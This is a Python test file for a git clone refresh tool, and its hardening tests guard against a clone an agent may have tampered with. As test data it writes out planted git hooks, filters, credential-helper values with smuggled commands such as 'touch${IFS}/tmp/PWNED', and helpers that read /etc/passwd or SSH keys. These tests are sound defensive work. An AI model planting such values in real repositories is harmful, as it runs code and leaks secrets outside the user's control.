        for bad in ("abc", "-1", ""):  # test_timeout_values covers many more spellings, without running git
            with self.subTest(value=bad):
                new = self.push_from_other("greeting.txt", "value %r\n" % bad)
                self.assertAnswer(self.refresh(env={"SDLCA_REFRESH_TIMEOUT": bad}), "updated", "ok")
                self.assertEqual(self.head(), new)

    def test_timeout_values(self):
        self.assertEqual(refresh.timeout_from(None), 60)
        for bad in ("", "abc", "-1", "+5", "1.5", " 5", "5 ", "5s", "0x10", "1e3", "\u0663", "\u0660"):
            self.assertEqual(refresh.timeout_from(bad), 60, repr(bad))
        self.assertEqual(refresh.timeout_from("0"), 0)
        self.assertEqual(refresh.timeout_from("00"), 0)
        self.assertEqual(refresh.timeout_from("7"), 7)
        self.assertEqual(refresh.timeout_from("007"), 7)
        self.assertEqual(refresh.timeout_from("3600"), 3600)
        self.assertEqual(refresh.timeout_from("86400"), 86400)
        self.assertEqual(refresh.timeout_from("86401"), 86400)  # more than a day counts as a day
        self.assertEqual(refresh.timeout_from("9" * 18), 86400)
        self.assertEqual(refresh.timeout_from("9" * 5000), 86400)  # however long: it is a whole number, and Python is never asked to convert it
        self.assertEqual(refresh.timeout_from("0" * 5000), 0)

    def test_clean_text(self):
        self.assertEqual(refresh.clean("a\tb\nc\x00d\x1b[31m\x07 e", 200), "a b c d [31m e")
        self.assertEqual(refresh.clean("\u202eevil\u2028line\u2029par\u200b", 200), "evil line par")
        self.assertEqual(refresh.clean("see https://" + "user:pw" + "@host.example/x and ssh://" + "me@h/y", 200), "see https://host.example/x and ssh://h/y")  # check-secrets:allow
        self.assertEqual(refresh.clean("x" * 50, 20), "x" * 17 + "...")
        self.assertEqual(refresh.clean("  \n\t ", 20), "")

    def test_a_line_of_a_megabyte_is_cut_before_it_is_scrubbed(self):
        """The patterns that scrub text are not linear, so nothing long may ever reach them. Proved by what they are given, not by
        how long they take: a run without the cut would not fail here, it would take minutes (and the watchdog would end it)."""
        seen = []

        class Spy:
            def __init__(self, pattern):
                self.pattern = pattern

            def sub(self, replacement, text):
                seen.append(len(text))
                return self.pattern.sub(replacement, text)

            def fullmatch(self, text):
                seen.append(len(text))
                return self.pattern.fullmatch(text)

        spies = {name: Spy(getattr(refresh, name)) for name in ("USERINFO_IN_URL", "SECRET_SHAPES", "SECRET_HEADERS", "HELPER_SHAPE")}
        with mock.patch.multiple(refresh, **spies):
            self.assertEqual(refresh.clean("a" * 10 ** 6, 120), "a" * 117 + "...")
            self.assertEqual(refresh.clean("see https://" + "x" * 10 ** 6, 120)[:12], "see https://")
            self.assertFalse(refresh.helper_is_the_kits("!f() { echo username=" + "; echo password=$(cat " * 50000, {}))
        self.assertTrue(seen, "the patterns were never used")
        self.assertLessEqual(max(seen), max(refresh.RAW_LIMIT, refresh.HELPER_LIMIT))

    def test_a_remote_that_says_megabytes_cannot_stall_the_update(self):
        body = 'for a in "$@"; do if [ "$a" = fetch ]; then head -c 3000000 /dev/zero | tr "\\0" a >&2; exit 128; fi; done\nexec "$REAL_GIT" "$@"\n'
        started = time.monotonic()
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
        self.assertLess(time.monotonic() - started, 15)
        self.assertAnswer(answer, "failed", "fetch")
        self.assertEqual(answer.text, "git said: " + "a" * 117 + "...")

    def test_standard_output_that_is_far_more_than_an_answer_is_not_trusted(self):
        body = 'for a in "$@"; do if [ "$a" = symbolic-ref ]; then head -c 9000000 /dev/zero | tr "\\0" a; exit 0; fi; done\nexec "$REAL_GIT" "$@"\n'
        before = self.raw_snapshot()
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
        self.assertAnswer(answer, "failed", "error")
        self.assertEqual(answer.text, "git printed more than this tool reads")
        self.assertEqual(self.raw_snapshot(), before)

    def test_usage_goes_to_standard_error_and_standard_output_stays_empty(self):
        for args, code in (([], 2), (["a", "b", "c"], 2), ([""], 2), (["", "-"], 2), (["--help"], 0), (["-h"], 0)):
            result = subprocess.run([sys.executable, "-I", "-B", REFRESH, *args], capture_output=True, text=True, env=dict(self.env, PATH=os.environ["PATH"]))
            self.assertEqual(result.returncode, code, args)
            self.assertEqual(result.stdout, "", args)
            self.assertIn("usage:", result.stderr, args)

    def test_a_clone_path_that_looks_like_an_option_is_only_a_folder_name(self):
        self.assertAnswer(self.refresh(clone="-x", cwd=self.tmp.name), "skipped", "not-git")


class TimeoutTests(RefreshCase):
    def hang_on_fetch(self, limit="1", body=HANGING_FETCH):
        pids = os.path.join(self.tmp.name, "pids")
        return {"PATH": self.path_with(self.fake_git(body)), "PIDS": pids, "SDLCA_REFRESH_TIMEOUT": limit}, pids

    def test_a_hung_git_is_stopped_with_everything_it_started(self):
        env, pids = self.hang_on_fetch()
        before = self.raw_snapshot()
        started = time.monotonic()
        answer = self.refresh(env=env)
        elapsed = time.monotonic() - started
        self.assertAnswer(answer, "failed", "timeout")
        self.assertEqual(answer.text, "a git call took longer than 1 second and was stopped")
        self.assertLess(elapsed, 6)  # the limit, and a short moment to stop it
        started_pids = read_pids(pids)
        self.assertEqual(len(started_pids), 2)  # the shell that stands in for git, and its child: the whole group, not only the child
        self.assertTrue(wait_until_gone(started_pids), "a process of the hung git is still running")
        self.no_locks()
        self.assertEqual(self.raw_snapshot(), before)

    def test_a_git_that_ignores_the_polite_stop_is_killed_after_the_grace_period(self):
        env, pids = self.hang_on_fetch(body="trap '' TERM\n" + HANGING_FETCH)
        with mock.patch.object(refresh, "TERM_GRACE", 0.3):
            started = time.monotonic()
            status, code, _ = refresh.refresh(self.clone, self.address, dict(self.env, **env))
            elapsed = time.monotonic() - started
        self.assertEqual((status, code), ("failed", "timeout"))
        self.assertLess(elapsed, 5)
        self.assertTrue(wait_until_gone(read_pids(pids)), "a process that ignored SIGTERM survived")

    @unittest.skipUnless(os.path.isdir("/proc"), "needs /proc to look for leftover processes")
    def test_a_remote_that_accepts_the_connection_and_never_answers_is_stopped_and_nothing_stays_running(self):
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(5)
        self.addCleanup(listener.close)
        port = listener.getsockname()[1]
        held = []

        def accept_forever():
            while True:
                try:
                    held.append(listener.accept()[0])
                except OSError:
                    return

        threading.Thread(target=accept_forever, daemon=True).start()
        self.addCleanup(lambda: [c.close() for c in held])
        address = "http://127.0.0.1:%d/world.git" % port
        self.git("remote", "set-url", "origin", address)
        before = self.tree_state()
        started = time.monotonic()
        answer = self.refresh(env={"GIT_ALLOW_PROTOCOL": "http", "SDLCA_REFRESH_TIMEOUT": "2"}, address=address)
        self.assertLess(time.monotonic() - started, 12)
        self.assertAnswer(answer, "failed", "timeout")
        self.assertEqual(answer.text, "a git call took longer than 2 seconds and was stopped")
        deadline = time.monotonic() + 5
        while processes_with(":%d/world.git" % port) and time.monotonic() < deadline:
            time.sleep(0.05)
        self.assertEqual(processes_with(":%d/world.git" % port), [], "git or its remote helper is still running")
        self.no_locks()
        self.assertEqual(self.tree_state(), before)

    def world_with_a_file_filter(self):
        """The world filters *.dat files. The clone is brought up to the commit that adds z.dat, and the world then changes both greeting.txt and
        z.dat, so a fast-forward writes greeting.txt first (it has no filter) and z.dat second (it has one). The filter is the user's own and
        global, and starts out as a plain cat. Returns the new tip."""
        self.write(self.other, ".gitattributes", "*.dat filter=slow\n")
        self.write(self.other, "z.dat", "z1\n")
        self.push_from_other("notes.txt", "with a filter\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.write(self.other, "z.dat", "z2\n")
        return self.push_from_other("greeting.txt", "two\n")

    def set_slow_filter(self, seconds):
        """Make the smudge filter take this long. The duration is one nothing else here uses, so that the filter can be found by it
        (and not 'sleep 20', which the handler's own test kills by name)."""
        duration = "%s.%06d" % (seconds, random.randrange(10 ** 6))
        self.git("config", "--file", self.global_config, "filter.slow.smudge", "sleep %s; cat" % duration)
        self.git("config", "--file", self.global_config, "filter.slow.clean", "cat")
        return "sleep " + duration

    @unittest.skipUnless(os.path.isdir("/proc"), "needs /proc to look for leftover processes")
    def test_a_fast_forward_that_runs_out_of_time_says_so_and_leaves_no_lock_file_and_the_branch_where_it_was(self):
        new_tip = self.world_with_a_file_filter()
        old = self.head()
        slow = self.set_slow_filter(913)
        env = dict(self.env, PATH=os.environ["PATH"], SDLCA_REFRESH_TIMEOUT="2")
        with mock.patch.object(refresh, "MERGE_MINIMUM", 0):  # the real floor is ten minutes: here the fast-forward gets the same two seconds as every other call
            started = time.monotonic()
            status, code, text = refresh.refresh(self.clone, self.address, env)
            elapsed = time.monotonic() - started
        self.assertLess(elapsed, 12)
        self.assertEqual((status, code), ("failed", "merge"))  # the world was reached: this is not a network problem
        self.assertIn("fast-forward ran out of time after 2 seconds", text)
        self.assertIn("half updated", text)
        self.no_locks()  # SIGTERM first: git removes .git/index.lock itself. A SIGKILL would have left it behind
        self.assertEqual(self.head(), old)
        self.assertNotEqual(old, new_tip)
        self.assertTrue(wait_until_gone([int(e.split("/")[2]) for e in processes_with(slow)]), "the filter is still running")
        # why the real floor exists: the branch did not move, but the files already written look like the person's own edits
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")
        self.assertEqual(self.git("status", "--porcelain=v1").stdout, " M greeting.txt\n D z.dat\n")
        self.git("config", "--file", self.global_config, "filter.slow.smudge", "cat")
        again = self.refresh()
        self.assertAnswer(again, "failed", "merge")  # and so the next update refuses: it is not silently fine
        self.assertEqual(self.head(), old)
        # the way out, as docs/operations.md says it: put the files back, and the next update goes through
        self.git("checkout", "-q", "--", ".")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new_tip)

    def test_a_slow_fast_forward_is_not_stopped_by_a_short_limit_for_the_other_calls(self):
        new_tip = self.world_with_a_file_filter()
        self.set_slow_filter(4)  # longer than the 3 seconds each other call gets, much shorter than the floor
        started = time.monotonic()
        answer = self.refresh(env={"SDLCA_REFRESH_TIMEOUT": "3"})
        self.assertGreaterEqual(time.monotonic() - started, 4)
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(self.head(), new_tip)
        self.assertEqual(self.git("status", "--porcelain=v1").stdout, "")  # a complete update, not a half one
        self.assertEqual(self.read(self.clone, "z.dat"), "z2\n")

    def test_a_git_that_has_finished_is_not_kept_waiting_by_a_program_it_left_running(self):
        pids = os.path.join(self.tmp.name, "background-pid")
        body = 'for a in "$@"; do if [ "$a" = fetch ]; then sleep 31.%06d & echo $! > "$PIDS"; fi; done\nexec "$REAL_GIT" "$@"\n' % random.randrange(10 ** 6)
        new = self.push_from_other("greeting.txt", "two\n")
        started = time.monotonic()
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body)), "PIDS": pids, "SDLCA_REFRESH_TIMEOUT": "6"})
        elapsed = time.monotonic() - started
        try:
            self.assertAnswer(answer, "updated", "ok")  # it used to wait out the limit for the pipes, and then say timeout
            self.assertLess(elapsed, 5)
            self.assertEqual(self.head(), new)
        finally:
            with open(pids) as handle:
                os.kill(int(handle.read()), signal.SIGKILL)  # the stand-in for a helper that stays around: do not leave it behind

    def test_stopping_the_refresh_itself_stops_the_git_it_started(self):
        for number in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT):  # a stop from the handler's timeout, a closed terminal and a Ctrl-C
            with self.subTest(signal=number.name):
                env, pids = self.hang_on_fetch(limit="60")
                if os.path.exists(pids):
                    os.unlink(pids)
                full = dict(self.env)
                full.update(env)
                process = subprocess.Popen([sys.executable, "-I", "-B", REFRESH, *self.arguments()], env=full, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                self.addCleanup(process.kill)
                deadline = time.monotonic() + 10
                while time.monotonic() < deadline and not (os.path.exists(pids) and len(read_pids(pids)) == 2):
                    time.sleep(0.05)
                started_pids = read_pids(pids)
                process.send_signal(number)
                out, err = process.communicate(timeout=WATCHDOG)
                self.assertEqual(process.returncode, 128 + number)
                self.assertEqual(out, "")  # no half answer: the handler treats silence as failed/error
                self.assertTrue(wait_until_gone(started_pids), "git kept running after the refresh was stopped")
                self.no_locks()


class HardeningTests(RefreshCase):
    """The clone is a folder the agent may have written to, and this code runs outside the agent's tool limits."""

    def hook(self, directory, name):
        os.makedirs(directory, exist_ok=True)
        path = os.path.join(directory, name)
        os.replace(self.program(name + ".sh"), path)

    def behind_by_one(self):
        return self.push_from_other("greeting.txt", "two\n")

    def plain_ff_merge(self):
        """The control: step back one commit and let plain git do what the refresh did."""
        self.git("reset", "-q", "--hard", "HEAD~1")
        self.git("merge", "-q", "--ff-only", "origin/main")

    def test_a_post_merge_hook_planted_in_the_clone_does_not_run(self):
        self.hook(os.path.join(self.clone, ".git", "hooks"), "post-merge")
        self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertFalse(os.path.exists(self.marker), "the clone's own hook ran")
        self.plain_ff_merge()
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not run the hook, so this test proves nothing")

    def test_no_other_hook_runs_either(self):
        for name in ("pre-merge-commit", "post-checkout", "reference-transaction", "post-index-change", "pre-auto-gc", "post-merge", "post-update"):
            self.hook(os.path.join(self.clone, ".git", "hooks"), name)
        self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertFalse(os.path.exists(self.marker), "a hook ran")
        self.plain_ff_merge()
        self.assertTrue(os.path.exists(self.marker), "control: plain git ran none of them, so this test proves nothing")

    def test_a_hooks_path_set_in_the_clone_configuration_is_not_followed(self):
        hooks = os.path.join(self.tmp.name, "hooks-elsewhere")
        self.hook(hooks, "post-merge")
        self.git("config", "--local", "core.hooksPath", hooks)
        self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")  # the override neutralizes it, so it does not even make the clone untrusted
        self.assertFalse(os.path.exists(self.marker), "a hook from core.hooksPath ran")
        self.plain_ff_merge()
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not follow core.hooksPath")

    def test_a_hooks_path_in_the_global_configuration_is_not_followed_either(self):
        hooks = os.path.join(self.tmp.name, "global-hooks")
        self.hook(hooks, "post-merge")
        self.behind_by_one()
        self.git("config", "--file", self.global_config, "core.hooksPath", hooks)
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertFalse(os.path.exists(self.marker), "a hook from the global core.hooksPath ran")
        self.plain_ff_merge()
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not follow the global core.hooksPath")

    def test_a_file_system_monitor_command_in_the_clone_configuration_does_not_run(self):
        self.git("config", "--local", "core.fsmonitor", self.program())
        self.behind_by_one()
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("core.fsmonitor", answer.text)
        self.assertNotIn("program.sh", answer.text)  # the key, never the value
        self.assertFalse(os.path.exists(self.marker))
        self.assertEqual(self.raw_snapshot(), before)
        self.git("status", "--short")
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not run the monitor, so this test proves nothing")

    def test_a_file_system_monitor_command_in_the_global_configuration_does_not_run(self):
        self.behind_by_one()
        self.git("config", "--file", self.global_config, "core.fsmonitor", self.program())
        self.assertAnswer(self.refresh(), "updated", "ok")  # the command line override wins even though nothing in the clone is wrong
        self.assertFalse(os.path.exists(self.marker), "the global file system monitor ran")
        self.git("status", "--short")
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not run the global monitor, so this test proves nothing")

    def test_a_global_configuration_cannot_change_the_outcome(self):
        hooks = os.path.join(self.tmp.name, "global-hooks")
        self.hook(hooks, "post-merge")
        old = self.head()
        new = self.behind_by_one()
        for key, value in (("pull.rebase", "true"), ("merge.ff", "false"), ("core.hooksPath", hooks), ("merge.autoStash", "true"), ("rebase.autoStash", "true")):
            self.git("config", "--file", self.global_config, key, value)
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)
        self.assertEqual(self.merges(), [])  # merge.ff=false would make a plain `git merge` create a merge commit
        self.assertEqual(self.git("rev-parse", "HEAD^").stdout.strip(), old)
        self.assertFalse(os.path.exists(self.marker))
        # controls: with these settings plain git really does behave differently
        self.git("reset", "-q", "--hard", "HEAD~1")
        self.git("merge", "-q", "--no-edit", "origin/main")
        self.assertTrue(self.merges(), "control: merge.ff=false did not make plain git create a merge commit")
        self.assertTrue(os.path.exists(self.marker), "control: the global hook did not run for plain git")

    def test_automatic_stashing_in_the_global_configuration_never_turns_a_refusal_into_conflict_markers(self):
        self.write(self.clone, "greeting.txt", "my edit\n")
        self.push_from_other("greeting.txt", "two\n")
        self.git("config", "--file", self.global_config, "merge.autoStash", "true")
        before = self.tree_state()
        self.assertAnswer(self.refresh(), "failed", "merge")
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.git("stash", "list").stdout, "")
        self.assertEqual(self.read(self.clone, "greeting.txt"), "my edit\n")
        # control: plain git with the same setting stashes, merges and leaves conflict markers behind
        self.git("merge", "-q", "--ff-only", "origin/main", check=False)
        self.assertIn("<<<<<<<", self.read(self.clone, "greeting.txt"), "control: plain git did not autostash, so this test proves nothing")

    def test_a_filter_in_the_clone_configuration_makes_the_clone_untrusted_and_does_not_run(self):
        self.git("config", "--local", "filter.evil.smudge", "touch '%s'; cat" % self.marker)
        self.git("config", "--local", "filter.evil.clean", "cat")
        self.write(self.other, ".gitattributes", "* filter=evil\n")
        self.behind_by_one()
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("filter.evil.", answer.text)  # it names the key
        self.assertNotIn("touch", answer.text)  # and never the value
        self.assertFalse(os.path.exists(self.marker))
        self.assertFalse(os.path.exists(os.path.join(self.clone, ".git", "FETCH_HEAD")), "it fetched into a clone it does not trust")
        self.assertEqual(self.raw_snapshot(), before)
        self.git("fetch", "-q", "origin", "main")  # control: plain git runs the smudge filter when it moves the branch
        self.git("merge", "-q", "--ff-only", "FETCH_HEAD")
        self.assertTrue(os.path.exists(self.marker), "control: plain git did not run the filter, so this test proves nothing")

    RISKY = (
        ("core.sshCommand", "touch {marker}"), ("core.gitProxy", "touch {marker}"), ("core.askPass", "touch {marker}"), ("core.fsmonitor", "touch {marker}"),
        ("core.alternateRefsCommand", "touch {marker}"), ("core.worktree", None),
        ("include.path", "{marker}.cfg"), ("includeIf.gitdir:/somewhere/.path", "{marker}.cfg"),
        ("url.https://example.invalid/.insteadOf", "https://elsewhere.invalid/"), ("url.https://example.invalid/.pushInsteadOf", "https://elsewhere.invalid/"),
        ("remote.origin.proxy", "http://proxy.invalid"), ("remote.origin.uploadpack", "touch {marker}"), ("remote.origin.receivepack", "touch {marker}"),
        ("remote.origin.vcs", "unlikelyhelper"),
        ("filter.x.clean", "touch {marker}"), ("filter.x.smudge", "touch {marker}"), ("filter.x.process", "touch {marker}"), ("filter.x.required", "true"),
        ("gpg.program", "touch {marker}"), ("gpg.ssh.program", "touch {marker}"), ("uploadpack.packObjectsHook", "touch {marker}"),
        ("merge.x.driver", "touch {marker}"), ("branch.main.mergeOptions", "--squash"),
        ("credential.helper", "!touch {marker}"), ("credential.helper", "store"), ("credential.https://git.example.invalid.helper", "!touch {marker}"),
        # where a request goes, whom git trusts and what it sends: with a proxy or a changed certificate check, the request that carries the token is not between git and the host
        ("http.proxy", "http://proxy.invalid"), ("http.proxyAuthMethod", "basic"), ("http.https://git.spawn.co.proxy", "http://proxy.invalid"),
        ("http.sslVerify", "false"), ("http.https://git.spawn.co.sslVerify", "false"), ("http.sslCAInfo", "{marker}.pem"), ("http.sslCAPath", "{marker}.d"),
        ("http.sslCert", "{marker}.crt"), ("http.sslKey", "{marker}.key"), ("http.curloptResolve", "git.spawn.co:443:127.0.0.1"),
        ("http.followRedirects", "true"), ("http.extraHeader", "X-Evil: 1"), ("http.cookieFile", "{marker}.cookies"), ("http.saveCookies", "true"),
        ("http.proactiveAuth", "basic"),  # without a url in it: for every host, which is not what the kit writes
        ("http.emptyAuth", "true"), ("http.delegation", "always"), ("http.sslBackend", "openssl"), ("http.pinnedPubkey", "sha256//x"),
        ("fetch.bundleURI", "https://elsewhere.invalid/b.bundle"), ("bundle.x.uri", "https://elsewhere.invalid/b.bundle"),
        ("remote.origin.proxyAuthMethod", "basic"),
        # a promisor remote: git fetches a missing object from it by itself, even when the update only reads a commit
        ("extensions.partialClone", "origin"), ("remote.origin.promisor", "true"), ("remote.origin.partialCloneFilter", "blob:none"),
        ("promisor.acceptFromServer", "all"),
    )

    def test_each_setting_that_can_run_a_program_or_redirect_git_makes_the_clone_untrusted_before_anything_is_fetched(self):
        self.behind_by_one()
        for key, value in self.RISKY:
            with self.subTest(key=key, value=value):
                value = self.clone if value is None else value.format(marker=self.marker)  # core.worktree: the clone itself, spelled in the configuration
                self.git("config", "--local", "--add", key, value)
                before = self.raw_snapshot()
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "untrusted")
                self.assertIn(key.lower(), answer.text)
                self.assertNotIn(value, answer.text)  # the key, never the value
                self.assertEqual(self.raw_snapshot(), before)  # nothing at all was touched, not even FETCH_HEAD
                self.git("config", "--local", "--unset-all", key)
        self.assertFalse(os.path.exists(self.marker))
        self.assertAnswer(self.refresh(), "updated", "ok")  # and with all of them removed the clone is trusted again

    def test_the_key_in_the_answer_is_spelled_as_git_prints_it_so_it_can_be_removed(self):
        self.git("config", "--local", "filter.LFS.smudge", "cat")  # a subsection name is case sensitive in git
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("filter.LFS.smudge", answer.text)
        self.assertEqual(self.git("config", "--local", "--unset-all", "filter.LFS.smudge").returncode, 0)  # the key in the answer is one git accepts
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_a_setting_hidden_in_the_work_tree_configuration_file_is_found_too(self):
        self.git("config", "--local", "extensions.worktreeConfig", "true")
        self.git("config", "--local", "core.repositoryformatversion", "1")
        self.git("config", "--worktree", "filter.hidden.smudge", "touch " + self.marker)
        self.assertTrue(os.path.exists(os.path.join(self.clone, ".git", "config.worktree")))
        self.assertNotIn("filter.hidden", self.git("config", "--local", "--list").stdout)  # --local alone cannot see it
        self.behind_by_one()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn("filter.hidden.smudge", answer.text)

    def test_settings_that_look_alike_but_cannot_run_anything_are_fine(self):
        self.use_https_address()  # a helper (here an empty one) may be scoped to the origin of the recorded address, and to no other
        for key, value in (("user.name", "Someone"), ("user.email", "s@example.invalid"), ("core.hooksPath", "/nonexistent"), ("core.pager", "less"),
                           ("pull.rebase", "true"), ("merge.ff", "false"), ("http.https://git.spawn.co.proactiveAuth", "basic"),
                           ("remote.origin.fetch", "+refs/notes/*:refs/notes/*"), ("credential.helper", ""), ("lfs.repositoryformatversion", "0"),
                           ("credential.https://git.spawn.co.helper", ""), ("http.postBuffer", "524288000"), ("http.lowSpeedLimit", "1000"),
                           ("http.lowSpeedTime", "20"), ("http.version", "HTTP/1.1"), ("http.userAgent", "git/example"),
                           ("http.https://git.spawn.co.postBuffer", "1048576")):
            self.git("config", "--local", "--add", key, value)
        self.behind_by_one()
        self.assertAnswer(self.refresh(), "updated", "ok")

    def test_the_credential_helper_the_kit_writes_is_trusted_and_look_alikes_are_not(self):
        home = "/home/u/.sdlca/spawn"
        own = home + "/accounts/alice/token"
        env = {"SDLCA_SPAWN_HOME": home, "SPAWN_TOKEN_FILE": own}
        for user in ("alice_helper", "a.b-c"):
            self.assertTrue(refresh.helper_is_the_kits(gitcred.helper_command(user, own), env), user)
        # another of your accounts made the clone: its token file is one of the kit's own, whether the account is one word or two
        for other in (home + "/accounts/bob/token", home + "/accounts/group/bob/token"):
            self.assertTrue(refresh.helper_is_the_kits(gitcred.helper_command("bob_helper", other), env), other)
        # your own token file may be anywhere, and spelled with characters that need quoting: the quoting must survive
        for odd in ("/p/odd dir/tok'en", "/p/with$dollar/token", "/p/semi;colon/`x`"):
            self.assertTrue(refresh.helper_is_the_kits(gitcred.helper_command("alice_helper", odd), dict(env, SPAWN_TOKEN_FILE=odd)), odd)
        self.assertTrue(refresh.helper_is_the_kits("", env))  # an empty helper only clears the list
        good = gitcred.helper_command("alice_helper", own)
        for bad in (
            good + "; touch /tmp/x",
            good.replace("; f", "; touch /tmp/x; f"),
            good.replace("echo username=alice_helper;", "echo username=alice_helper; touch /tmp/x;"),
            good.replace("$(cat " + own + ")", "$(cat " + own + "; touch /tmp/x)"),
            good.replace(own, "/p/$(touch /tmp/x)"),
            good.replace(own, "/p/a b"),  # two words: not what the kit writes
            good.replace(own, "'/p/a b"),  # an unbalanced quote
            good.replace("alice_helper", "alice helper"),
            good.replace("!f()", "f()"),
            good + "\n",
            "!echo hijacked", "store", "cache --timeout 1", "/usr/bin/evil",
            "!f() { echo username=u; echo password=$(cat /t); }; f; f",
            # one plain word each, but not the way the kit writes it: the round trip through the kit's own writer is the only thing that refuses these
            "!f() { echo username=alice;touch${IFS}/tmp/PWNED; echo password=$(cat " + own + "); }; f",
            "!f() { echo username=alice; echo password=$(cat " + home + "/accounts/alice/tok`id`); }; f",
            "!f() { echo username='alice_helper'; echo password=$(cat " + own + "); }; f",
            "!f() { echo username=alice_helper; echo password=$(cat '" + own + "'); }; f",
        ):
            self.assertFalse(refresh.helper_is_the_kits(bad, env), bad)
        # a helper that reads some other file is not the kit's, however well it is written: this is how a clone could make the kit send a file to a host
        for path in ("/etc/passwd", "/home/u/.ssh/id_ed25519", home + "/accounts/alice/token.bak", home + "/accounts/alice/token/",
                     home + "/accounts/../../../.ssh/id_rsa", home + "/accounts/Alice/token", home + "/accounts/a/b/c/token", home + "/accounts//token",
                     home + "/run/token", home + "/accounts/alice/env", "/other/spawn/accounts/alice/token", home + "/accounts/-bad/token"):
            self.assertFalse(refresh.helper_is_the_kits(gitcred.helper_command("alice_helper", path), env), path)
        # with no account in the environment (a run by hand) only the kit's accounts folder is trusted, and the home defaults to ~/.sdlca/spawn
        self.assertTrue(refresh.helper_is_the_kits(gitcred.helper_command("u", home + "/accounts/alice/token"), {"HOME": "/home/u"}))
        self.assertFalse(refresh.helper_is_the_kits(gitcred.helper_command("u", "/etc/passwd"), {"HOME": "/home/u"}))

    def test_a_value_that_is_one_word_per_field_but_not_the_kits_really_does_run_a_command(self):
        """The positive control for the look-alikes above: git runs such a value, so refusing it is not a formality."""
        value = "!f() { echo username=alice;touch${IFS}%s; echo password=$(cat %s); }; f" % (self.marker, self.token_file)  # the kit's shape, with a second command in a plain word
        self.assertTrue(refresh.HELPER_SHAPE.fullmatch(value), "this value must look like the kit's, or the round trip is not what refuses it")
        self.assertFalse(refresh.helper_is_the_kits(value, dict(self.env)))
        subprocess.run([REAL_GIT, "-c", "credential.helper=" + value, "credential", "fill"], input="protocol=https\nhost=example.invalid\n\n",
                       env=dict(self.env, PATH=os.environ["PATH"]), cwd=self.tmp.name, capture_output=True, text=True, timeout=WATCHDOG)
        self.assertTrue(os.path.exists(self.marker), "control: git did not run the look-alike helper, so refusing it proves nothing")

    def test_a_clone_made_the_way_sdlca_worlds_makes_it_is_updated_and_one_edit_to_its_helper_makes_it_untrusted(self):
        made = self.kit_made_clone()
        config = self.git("config", "--local", "--list", cwd=made).stdout
        self.assertIn("credential.https://git.spawn.co.helper=", config)  # the helper really is in this clone
        self.assertIn("http.https://git.spawn.co.proactiveauth=basic", config)
        self.assertIn("remote.origin.fetch=+refs/notes/*:refs/notes/*", config)
        new = self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(clone=made, address=SPAWN_ADDRESS), "updated", "ok")
        self.assertEqual(self.head(made), new)
        self.assertEqual(self.git("config", "--local", "--list", cwd=made).stdout, config)  # nothing in its settings changed
        key = "credential.https://git.spawn.co.helper"
        self.git("config", "--local", key, gitcred.helper_command("alice_helper", self.token_file) + "; touch " + self.marker, cwd=made)
        self.push_from_other("greeting.txt", "three\n")
        answer = self.refresh(clone=made, address=SPAWN_ADDRESS)
        self.assertAnswer(answer, "skipped", "untrusted")
        self.assertIn(key, answer.text)
        self.assertFalse(os.path.exists(self.marker))

    def test_a_credential_helper_that_would_send_another_file_or_go_to_another_kind_of_host_is_not_trusted(self):
        elsewhere = os.path.join(self.tmp.name, "not-a-token.txt")
        with open(elsewhere, "w") as handle:
            handle.write("a secret that is not the account's token\n")
        kits = gitcred.helper_command("alice_helper", self.token_file)
        self.use_https_address()
        self.behind_by_one()
        for key, value in (
            ("credential.https://git.spawn.co.helper", gitcred.helper_command("alice_helper", elsewhere)),  # the kit's form, some other file
            ("credential.helper", kits),  # the kit's own helper, but for every host: not what the kit writes
            ("credential.http://git.example.invalid.helper", kits),  # plain http, and not this machine
            ("credential.https://git.spawn.co/some/path.helper", kits),  # not scoped to a host
            ("credential.ftp://git.example.invalid.helper", kits),
        ):
            with self.subTest(key=key):
                self.git("config", "--local", "--add", key, value)
                before = self.raw_snapshot()
                answer = self.refresh()
                self.assertAnswer(answer, "skipped", "untrusted")
                self.assertIn(key, answer.text)
                self.assertEqual(self.raw_snapshot(), before)
                self.git("config", "--local", "--unset-all", key)
        self.git("config", "--local", "--add", "credential.https://git.spawn.co.helper", kits)  # and the real one is fine
        self.assertAnswer(self.refresh(), "updated", "ok")

    def test_the_clones_own_credential_helper_is_consulted(self):
        with AuthenticatedGitServer(self.tmp.name) as server:
            scope = "http://127.0.0.1:%d" % server.port
            address = scope + "/world.git"
            self.git("remote", "set-url", "origin", address)
            self.git("config", "--local", "credential.helper", "")  # what sdlca-worlds writes first
            self.git("config", "--local", "credential.%s.helper" % scope, gitcred.helper_command("alice_helper", self.token_file))
            self.git("config", "--local", "http.%s.proactiveAuth" % scope, "basic")
            new = self.push_from_other("greeting.txt", "two\n")
            self.git("update-server-info", cwd=self.world)
            answer = self.refresh(env={"GIT_ALLOW_PROTOCOL": "http"}, address=address)
            self.assertAnswer(answer, "updated", "ok")
